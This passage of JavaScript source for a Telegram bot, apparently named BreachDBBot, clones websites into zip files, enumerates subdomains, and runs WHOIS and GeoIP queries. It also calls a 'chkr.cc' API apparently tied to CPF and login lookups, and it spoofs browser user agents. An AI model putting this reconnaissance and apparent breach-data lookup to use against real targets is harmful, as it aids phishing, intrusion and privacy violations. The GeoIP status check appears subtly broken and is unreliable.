    const generalMatch = targetUrl.match(/(https?:\/\/[^\s]+|www\.[^\s]+|[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}[^\s]*)/i);
    if (generalMatch) targetUrl = generalMatch[1];
  }
  targetUrl = targetUrl.replace(/[\u200B-\u200D\uFEFF\u00A0]/g, '').replace(/\s+/g, '').replace(/[>\]\)`"';,.]$/, '');
  if (!targetUrl.startsWith('http://') && !targetUrl.startsWith('https://')) targetUrl = 'https://' + targetUrl;
  let parsedUrl;
  try { parsedUrl = new URL(targetUrl); } catch (e) {
    return bot.sendMessage(chatId, `❌ URL inválida: \`${rawUrl}\`\n\n💡 _Exemplo: \`example.com\`_`, opts({ parse_mode: 'Markdown' }));
  }
  if (!parsedUrl.hostname || !parsedUrl.hostname.includes('.')) {
    return bot.sendMessage(chatId, `❌ URL inválida: \`${rawUrl}\`\n\n💡 _Exemplo: \`example.com\`_`, opts({ parse_mode: 'Markdown' }));
  }
  bot.sendChatAction(chatId, 'upload_document', opts()).catch(() => {});
  runningSearches.set(chatId, { cancelled: false });
  const loadingMsg = await bot.sendMessage(chatId,
    `🌐 *Baixando:* \`${targetUrl}\`\n⏳ _Capturando página e assets..._`,
    opts({ parse_mode: 'Markdown', reply_markup: cancelSearchBtn })
  );
  const zipPath = path.join(TMP_DIR, `copyurl_${Date.now()}.zip`);
  try {
    const htmlBuffer = await fetchUrlBufferWithRetry(targetUrl, 5, null, 3);
    if (runningSearches.get(chatId)?.cancelled) { runningSearches.delete(chatId); return bot.editMessageText('⏹ Cancelado', { chat_id: chatId, message_id: loadingMsg.message_id, parse_mode: 'Markdown' }).catch(() => {}); }
    const htmlStr = htmlBuffer.toString('utf-8');
    const assetUrls = extractPageAssets(htmlStr, targetUrl);
    bot.editMessageText(
      `🌐 *Baixando:* \`${targetUrl}\`\n📄 _HTML capturado!_\n📦 _Baixando ${assetUrls.length} assets..._`,
      { chat_id: chatId, message_id: loadingMsg.message_id, parse_mode: 'Markdown' }
    ).catch(() => {});
    const assetMap = new Map();
    const assetBuffers = new Map();
    const downloadedUrls = new Set();
    const CONCURRENCY = 10;
    let downloaded = 0;
    let failed = 0;
    for (let i = 0; i < assetUrls.length; i += CONCURRENCY) {
      if (runningSearches.get(chatId)?.cancelled) break;
      const batch = assetUrls.slice(i, i + CONCURRENCY);
      await Promise.allSettled(batch.map(async (assetUrl) => {
        try {
          const buf = await fetchUrlBufferWithRetry(assetUrl, 5, targetUrl, 3);
          const localPath = assetUrlToPath(assetUrl, targetUrl);
          assetMap.set(assetUrl, localPath);
          assetBuffers.set(localPath, buf);
          downloadedUrls.add(assetUrl);
          downloaded++;
        } catch { failed++; }
      }));
      await new Promise(r => setTimeout(r, 50));
    }
    if (runningSearches.get(chatId)?.cancelled) { runningSearches.delete(chatId); return bot.editMessageText('⏹ Cancelado', { chat_id: chatId, message_id: loadingMsg.message_id, parse_mode: 'Markdown' }).catch(() => {}); }
    const cssAssets = [];
    for (const [localPath, buf] of assetBuffers.entries()) {
      if (localPath.includes('.css')) {
        let originalCssUrl = null;
        for (const [orig, loc] of assetMap.entries()) {
          if (loc === localPath) { originalCssUrl = orig; break; }
        }
        if (originalCssUrl) cssAssets.push({ localPath, buf, url: originalCssUrl });
      }
    }
    for (const cssFile of cssAssets) {
      const cssText = cssFile.buf.toString('utf-8');
      const nestedUrls = [];
      let m;
      const bgRe = /url\s*\(\s*["']?([^"')]+)["']?\s*\)/gi;
      while ((m = bgRe.exec(cssText)) !== null) {
        const resolved = resolveAssetUrl(cssFile.url, m[1]);
        if (resolved && !downloadedUrls.has(resolved)) { nestedUrls.push(resolved); downloadedUrls.add(resolved); }
      }
      const importRe = /@import\s+(?:url\s*\(\s*["']?([^"')]+)["']?\s*\)|["']([^"']+)["'])/gi;
      while ((m = importRe.exec(cssText)) !== null) {
        const resolved = resolveAssetUrl(cssFile.url, m[1] || m[2]);
        if (resolved && !downloadedUrls.has(resolved)) { nestedUrls.push(resolved); downloadedUrls.add(resolved); }
      }
      if (nestedUrls.length > 0) {
        for (let i = 0; i < nestedUrls.length; i += CONCURRENCY) {
          const batch = nestedUrls.slice(i, i + CONCURRENCY);
          await Promise.allSettled(batch.map(async (nestedUrl) => {
            try {
              const buf = await fetchUrlBufferWithRetry(nestedUrl, 5, cssFile.url, 3);
              const localPath = assetUrlToPath(nestedUrl, targetUrl);
              assetMap.set(nestedUrl, localPath);
              assetBuffers.set(localPath, buf);
              downloaded++;
            } catch { failed++; }
          }));
          await new Promise(r => setTimeout(r, 50));
        }
      }
      let rewrittenCss = cssText;
      for (const [origUrl, locPath] of assetMap.entries()) {
        const relPath = getRelativePath(cssFile.localPath, locPath);
        rewrittenCss = rewrittenCss.replace(new RegExp(origUrl.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'g'), relPath);
        try {
          const nestedAsset = new URL(origUrl);
          const cssBase = new URL(cssFile.url);
          if (nestedAsset.hostname === cssBase.hostname) {
            const escapedRel = nestedAsset.pathname.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
            rewrittenCss = rewrittenCss.replace(new RegExp(`url\\s*\\(\\s*["']?(?:\\.\\/)?\\/?${escapedRel}(?:\\?[^"')]+)?["']?\\s*\\)`, 'gi'), `url('${relPath}')`);
            rewrittenCss = rewrittenCss.replace(new RegExp(`@import\\s+["'](?:\\.\\/)?\\/?${escapedRel}(?:\\?[^"']*)?["']`, 'gi'), `@import '${relPath}'`);
          }
        } catch {}
      }
      assetBuffers.set(cssFile.localPath, Buffer.from(rewrittenCss, 'utf-8'));
    }
    const rewrittenHtml = rewritePageHtml(htmlStr, targetUrl, assetMap);
    await new Promise((resolve, reject) => {
      const output = fs.createWriteStream(zipPath);
      const archive = new archiver.ZipArchive({ zlib: { level: 6 } });
      output.on('close', resolve);
      archive.on('error', reject);
      archive.pipe(output);
      archive.append(Buffer.from(rewrittenHtml, 'utf-8'), { name: 'index.html' });
      for (const [localPath, buf] of assetBuffers.entries()) {
        archive.append(buf, { name: localPath });
      }
      archive.finalize();
    });
    const hostname = new URL(targetUrl).hostname;
    bot.sendChatAction(chatId, 'upload_document', opts()).catch(() => {});
    await bot.sendDocument(chatId, zipPath, opts({
      caption: `✅ *Site copiado com sucesso!*\n\n🌐 \`${hostname}\`\n📄 HTML + ${downloaded} assets baixados\n` +
               (failed > 0 ? `⚠️ ${failed} assets falharam\n` : '') +
               `📦 _Abra index.html para visualizar_`,
      parse_mode: 'Markdown',
      reply_markup: newSearchBtn
    }), { filename: `${hostname.replace(/\./g, '_')}.zip` });
    fs.unlinkSync(zipPath);
    await bot.editMessageText('✅ Concluído!', { chat_id: chatId, message_id: loadingMsg.message_id, parse_mode: 'Markdown' }).catch(() => {});
    runningSearches.delete(chatId);
  } catch (err) {
    console.error('[COPYURL ERROR]', err.message);
    runningSearches.delete(chatId);
    await bot.editMessageText(
      `❌ *Erro ao copiar site:*\n\`${err.message}\``,
      { chat_id: chatId, message_id: loadingMsg.message_id, parse_mode: 'Markdown' }
    ).catch(() => {});
    if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath);
  }
}

// ============================================
// SUBDOMÍNIOS (RapidDNS + crt.sh + HackerTarget)
// ============================================
async function sendSubdominiosResults(chatId, domain, threadId) {
  const opts = (o = {}) => threadId ? { message_thread_id: threadId, ...o } : o;
  domain = (domain || '').trim().toLowerCase().replace(/^https?:\/\//, '').replace(/\/.*$/, '');
  if (!domain || !/^[a-z0-9.-]+\.[a-z]{2,}$/i.test(domain)) {
    return bot.sendMessage(chatId, `❌ Domínio inválido. Exemplo: \`exemplo.com\``, opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🚀 SUBDOMÍNIOS', callback_data: 'srch_subdominios', style: 'primary' }], [{ text: '🏠 MENU PRINCIPAL', callback_data: 'back_start', style: 'primary' }]] } }));
  }
  const loadingMsg = await bot.sendMessage(chatId,
    `🌐 *Buscando subdomínios de:* \`${domain}\`\n\n⏳ Consultando RapidDNS + crt.sh...`,
    opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🔴 CANCELAR BUSCA', callback_data: 'cancel_search', style: 'primary' }]] } })
  );
  runningSearches.set(chatId, { cancelled: false, msgId: loadingMsg.message_id });
  const subs = new Set();
  const sources = [];
  const isSub = (n) => n.endsWith('.' + domain) || n === domain;
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), 90000);
  try {
    // 1) RapidDNS (HTML scrape)
    try {
      const res = await fetch(`https://rapiddns.io/subdomain/${encodeURIComponent(domain)}?full=1`, {
        signal: ctrl.signal,
        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
      });
      if (res.ok) {
        const html = await res.text();
        const matches = html.match(/<td>([a-zA-Z0-9._-]+\.[a-zA-Z]{2,})<\/td>/gi) || [];
        let added = 0;
        for (const m of matches) {
          const n = m.replace(/<\/?td>/gi, '').trim().toLowerCase();
          if (isSub(n) && !subs.has(n)) { subs.add(n); added++; }
        }
        if (added > 0) sources.push(`RapidDNS(${added})`);
      }
    } catch (e) { /* ignora */ }
    if (runningSearches.get(chatId)?.cancelled) { runningSearches.delete(chatId); clearTimeout(timer); return bot.editMessageText('⏹ Cancelado', { chat_id: chatId, message_id: loadingMsg.message_id }).catch(() => {}); }
    // 2) crt.sh (CT logs JSON)
    try {
      const res = await fetch(`https://crt.sh/?q=%25.${encodeURIComponent(domain)}&output=json`, {
        signal: ctrl.signal,
        headers: { 'User-Agent': 'Mozilla/5.0' }
      });
      if (res.ok) {
        const data = await res.json();
        let added = 0;
        for (const entry of data) {
          const names = (entry.name_value || '').split('\n');
          for (let n of names) {
            n = n.trim().toLowerCase();
            if (n && isSub(n) && !subs.has(n)) { subs.add(n); added++; }
          }
        }
        if (added > 0) sources.push(`crt.sh(${added})`);
      }
    } catch (e) { /* ignora */ }
    if (runningSearches.get(chatId)?.cancelled) { runningSearches.delete(chatId); clearTimeout(timer); return bot.editMessageText('⏹ Cancelado', { chat_id: chatId, message_id: loadingMsg.message_id }).catch(() => {}); }
    // 3) HackerTarget (CSV)
    try {
      const res = await fetch(`https://api.hackertarget.com/hostsearch/?q=${encodeURIComponent(domain)}`, {
        signal: ctrl.signal,
        headers: { 'User-Agent': 'Mozilla/5.0' }
      });
      if (res.ok) {
        const text = await res.text();
        const lines = text.split('\n');
        let added = 0;
        for (const line of lines) {
          const [n] = line.split(',');
          if (n) {
            const nn = n.trim().toLowerCase();
            if (isSub(nn) && !subs.has(nn)) { subs.add(nn); added++; }
          }
        }
        if (added > 0) sources.push(`HackerTarget(${added})`);
      }
    } catch (e) { /* ignora */ }
    clearTimeout(timer);
    await bot.editMessageText('✅ Concluído!', { chat_id: chatId, message_id: loadingMsg.message_id, parse_mode: 'Markdown' }).catch(() => {});
    runningSearches.delete(chatId);
    if (subs.size === 0) {
      return bot.sendMessage(chatId, `❌ Nenhum subdomínio encontrado para \`${domain}\``, opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🚀 SUBDOMÍNIOS', callback_data: 'srch_subdominios', style: 'primary' }], [{ text: '🏠 MENU PRINCIPAL', callback_data: 'back_start', style: 'primary' }]] } }));
    }
    const list = Array.from(subs).sort();
    const text = `# Subdomínios de ${domain}\n# Total: ${list.length}\n# Fontes: ${sources.join(', ') || 'nenhuma'}\n\n` + list.join('\n') + '\n';
    const filename = `subdominios_${domain.replace(/[^a-z0-9]/g, '_')}_${Date.now()}.txt`;
    const caption = `🌐 *SUBDOMÍNIOS de \`${domain}\`*\n\n` +
      `📊 *Total encontrado:* ${list.length}\n` +
      `🔍 *Fontes:* ${sources.join(', ') || 'parcial'}`;
    return bot.sendDocument(chatId, Buffer.from(text, 'utf-8'), opts({
      caption,
      parse_mode: 'Markdown',
      reply_markup: newSearchBtn
    }), { filename, contentType: 'text/plain' });
  } catch (err) {
    clearTimeout(timer);
    runningSearches.delete(chatId);
    await bot.editMessageText('❌ Erro', { chat_id: chatId, message_id: loadingMsg.message_id, parse_mode: 'Markdown' }).catch(() => {});
    const msg = err.name === 'AbortError' ? '⏰ Timeout' : `❌ Erro: ${err.message}`;
    return bot.sendMessage(chatId, msg, opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🚀 SUBDOMÍNIOS', callback_data: 'srch_subdominios', style: 'primary' }], [{ text: '🏠 MENU PRINCIPAL', callback_data: 'back_start', style: 'primary' }]] } }));
  }
}

// ============================================
// WHOIS
// ============================================
async function sendWhoisResults(chatId, query, threadId) {
  const opts = (o = {}) => threadId ? { message_thread_id: threadId, ...o } : o;
  query = (query || '').trim().toLowerCase().replace(/^https?:\/\//, '').replace(/\/.*$/, '');
  if (!query || !/^[a-z0-9.-]+\.[a-z]{2,}$/i.test(query)) {
    return bot.sendMessage(chatId, `❌ Domínio inválido. Exemplo: \`exemplo.com\``, opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🔍 Whois', callback_data: 'srch_whois' }], [{ text: '🏠 MENU PRINCIPAL', callback_data: 'back_start', style: 'primary' }]] } }));
  }
  const loadingMsg = await bot.sendMessage(chatId, `🛰 *WHOIS de:* \`${query}\`\n\n⏳ Consultando...`, opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🔴 CANCELAR BUSCA', callback_data: 'cancel_search', style: 'primary' }]] } }));
  runningSearches.set(chatId, { cancelled: false, msgId: loadingMsg.message_id });
  try {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), 30000);
    const res = await fetch(`https://rdap.org/domain/${encodeURIComponent(query)}`, { signal: ctrl.signal, headers: { 'Accept': 'application/rdap+json', 'User-Agent': 'BreachDBBot/1.0' } });
    clearTimeout(t);
    if (runningSearches.get(chatId)?.cancelled) { runningSearches.delete(chatId); return bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {}); }
    if (!res.ok) throw new Error(`RDAP retornou ${res.status}`);
    const data = await res.json();
    await bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});
    runningSearches.delete(chatId);
    const events = (data.events || []).reduce((acc, e) => { acc[e.eventAction] = e.eventDate; return acc; }, {});
    const status = (data.status || []).join(', ');
    const nameservers = (data.nameservers || []).map(n => n.ldhName).join('\n  ');
    const entities = (data.entities || []).map(e => {
      const roles = (e.roles || []).join(', ');
      const name = (e.vcardArray && e.vcardArray[1] && e.vcardArray[1].find(x => x[0] === 'fn') && e.vcardArray[1].find(x => x[0] === 'fn')[3]) || '';
      return `  - ${name || 'N/A'} (${roles})`;
    }).join('\n');
    const text = `# WHOIS de ${query}\n# Fonte: RDAP (rdap.org)\n\n` +
      `DOMAIN: ${data.ldhName}\n` +
      `HANDLE: ${data.handle || 'N/A'}\n` +
      `STATUS: ${status || 'N/A'}\n` +
      `REGISTERED: ${events.registration || 'N/A'}\n` +
      `EXPIRES: ${events.expiration || 'N/A'}\n` +
      `LAST CHANGED: ${events.lastChanged || events.last_update || 'N/A'}\n` +
      `REGISTRAR: ${entities || 'N/A'}\n` +
      `NAMESERVERS:\n  ${nameservers || 'N/A'}\n`;
    const filename = `whois_${query.replace(/[^a-z0-9]/g, '_')}_${Date.now()}.txt`;
    const caption = `🛰 *WHOIS de \`${query}\`*\n\n` +
      `📅 *Registrado:* ${(events.registration || 'N/A').split('T')[0]}\n` +
      `⏳ *Expira:* ${(events.expiration || 'N/A').split('T')[0]}\n` +
      `🏢 *Status:* ${status || 'N/A'}`;
    return bot.sendDocument(chatId, Buffer.from(text, 'utf-8'), opts({
      caption,
      parse_mode: 'Markdown',
      reply_markup: newSearchBtn
    }), { filename, contentType: 'text/plain' });
  } catch (err) {
    runningSearches.delete(chatId);
    try { await bot.deleteMessage(chatId, loadingMsg.message_id); } catch {}
    const msg = err.name === 'AbortError' ? '⏰ Timeout' : `❌ Erro: ${err.message}`;
    return bot.sendMessage(chatId, msg, opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🔍 Whois', callback_data: 'srch_whois' }], [{ text: '🏠 MENU PRINCIPAL', callback_data: 'back_start', style: 'primary' }]] } }));
  }
}

// ============================================
// GEOIP
// ============================================
async function sendGeoIpResults(chatId, ip, threadId) {
  const opts = (o = {}) => threadId ? { message_thread_id: threadId, ...o } : o;
  ip = (ip || '').trim();
  if (!/^(\d{1,3}\.){3}\d{1,3}$/.test(ip)) {
    return bot.sendMessage(chatId, `❌ IP inválido. Exemplo: \`8.8.8.8\``, opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '📍 GeoIP', callback_data: 'srch_geoip' }], [{ text: '🏠 MENU PRINCIPAL', callback_data: 'back_start', style: 'primary' }]] } }));
  }
  const loadingMsg = await bot.sendMessage(chatId, `📍 *GeoIP de:* \`${ip}\`\n\n⏳ Consultando ip-api.com...`, opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🔴 CANCELAR BUSCA', callback_data: 'cancel_search', style: 'primary' }]] } }));
  runningSearches.set(chatId, { cancelled: false, msgId: loadingMsg.message_id });
  try {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), 30000);
    const res = await fetch(`http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query`, { signal: ctrl.signal });
    clearTimeout(t);
    if (runningSearches.get(chatId)?.cancelled) { runningSearches.delete(chatId); return bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {}); }
    if (!res.ok) throw new Error(`ip-api retornou ${res.status}`);
    const data = await res.json();
    await bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});
    runningSearches.delete(chatId);
    if (data.status !== 'primary') throw new Error(data.message || 'falha na consulta');
    const text = `# GeoIP de ${ip}\n# Fonte: ip-api.com\n\n` +
      `IP: ${data.query}\n` +
      `PAÍS: ${data.country}\n` +
      `REGIÃO: ${data.regionName}\n` +
      `CIDADE: ${data.city}\n` +
      `CEP: ${data.zip}\n` +
      `LATITUDE: ${data.lat}\n` +
      `LONGITUDE: ${data.lon}\n` +
      `TIMEZONE: ${data.timezone}\n` +
      `ISP: ${data.isp}\n` +
      `ORG: ${data.org}\n` +
      `AS: ${data.as}\n`;
    const filename = `geoip_${ip.replace(/[^a-z0-9]/g, '_')}_${Date.now()}.txt`;
    const caption = `📍 *GeoIP de \`${ip}\`*\n\n` +
      `🌍 *${data.city}, ${data.regionName} - ${data.country}*\n` +
      `📡 *ISP:* ${data.isp}\n` +
      `🕐 *Timezone:* ${data.timezone}`;
    return bot.sendDocument(chatId, Buffer.from(text, 'utf-8'), opts({
      caption,
      parse_mode: 'Markdown',
      reply_markup: newSearchBtn
    }), { filename, contentType: 'text/plain' });
  } catch (err) {
    runningSearches.delete(chatId);
    try { await bot.deleteMessage(chatId, loadingMsg.message_id); } catch {}
    const msg = err.name === 'AbortError' ? '⏰ Timeout' : `❌ Erro: ${err.message}`;
    return bot.sendMessage(chatId, msg, opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '📍 GeoIP', callback_data: 'srch_geoip' }], [{ text: '🏠 MENU PRINCIPAL', callback_data: 'back_start', style: 'primary' }]] } }));
  }
}

// ══════════════════════════════════════════════════════
// API chkr.cc - Integrada com /cpf e /login
// ══════════════════════════════════════════════════════

const CHKR_API_URL = process.env.CHKR_API_URL || 'https://api.chkr.cc';
const CHKR_API_KEY = process.env.CHKR_API_KEY;

/**
 * Requisição para API chkr.cc
 */
function queryChkrApi(query, callback) {
  const endpoints = [
    `${CHKR_API_URL}/check?q=${encodeURIComponent(query)}`,
    `${CHKR_API_URL}/search?q=${encodeURIComponent(query)}`,
    `${CHKR_API_URL}/?q=${encodeURIComponent(query)}`,
    `${CHKR_API_URL}/api/check?q=${encodeURIComponent(query)}`
  ];

  const headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'pt-BR,pt;q=0.9,en;q=0.8'
  };
  
  if (CHKR_API_KEY) {
    headers['Authorization'] = `Bearer ${CHKR_API_KEY}`;
    headers['x-api-key'] = CHKR_API_KEY;
  }

  let endpoint = 0;
  
  function tryEndpoint() {
    if (endpoint >= endpoints.length) {
      return callback(null, { error: 'Nenhum endpoint respondeu' });
    }

    const url = endpoints[endpoint];
    endpoint++;

    const mod = url.startsWith('https') ? https : http;
    
    const reqOptions = {
      headers: headers,
      timeout: 10000
    };

    mod.get(url, reqOptions, (res) => {
      let body = '';
      
      res.on('data', (chunk) => body += chunk);
      res.on('end', () => {
        try {
          const data = JSON.parse(body);
          if (data && !data.error && Object.keys(data).length > 0) {
            return callback(data, null);
          }
          if (data && data.error) {
            tryEndpoint();
          } else if (!data || Object.keys(data).length === 0) {
            tryEndpoint();
          } else {
            callback(data, null);
          }
        } catch (e) {
          tryEndpoint();
        }
      });
    }).on('error', () => {
      tryEndpoint();
    }).on('timeout', function() {
      this.destroy();
      tryEndpoint();
    });
  }

  tryEndpoint();
}

